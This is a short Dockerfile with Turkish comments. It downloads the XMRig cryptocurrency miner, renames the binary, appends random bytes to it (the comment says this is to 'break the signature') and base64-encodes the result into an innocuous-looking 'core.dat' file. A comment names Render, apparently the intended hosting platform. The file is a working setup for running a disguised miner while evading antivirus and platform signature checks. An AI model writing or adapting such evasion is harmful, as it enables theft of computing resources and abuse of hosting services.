FROM debian:bookworm-slim

WORKDIR /server

# Bağımlılıklar
RUN apt-get update && apt-get install -y --no-install-recommends \
    wget curl ca-certificates python3 libstdc++6 \
    && rm -rf /var/lib/apt/lists/*

# XMRig Hazırlığı: İndir, İmzayı Boz, Base64 Şifrele
RUN wget -qO /tmp/sys.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz" \
    && tar xzf /tmp/sys.tar.gz -C /server \
    && mv /server/xmrig-6.21.0/xmrig /server/core_raw \
    && rm -rf /tmp/sys.tar.gz /server/xmrig-6.21.0 \
    && head -c 256 /dev/urandom >> /server/core_raw \
    && python3 -c "import base64; d=open('/server/core_raw','rb').read(); open('/server/core.dat','wb').write(base64.b64encode(d))" \
    && rm -rf /server/core_raw

COPY engine.py /engine.py
COPY start.sh /start.sh
RUN chmod +x /start.sh

# Render Kullanıcı Ayarı
RUN useradd -m -u 1001 appuser
USER 1001

CMD ["/start.sh"]
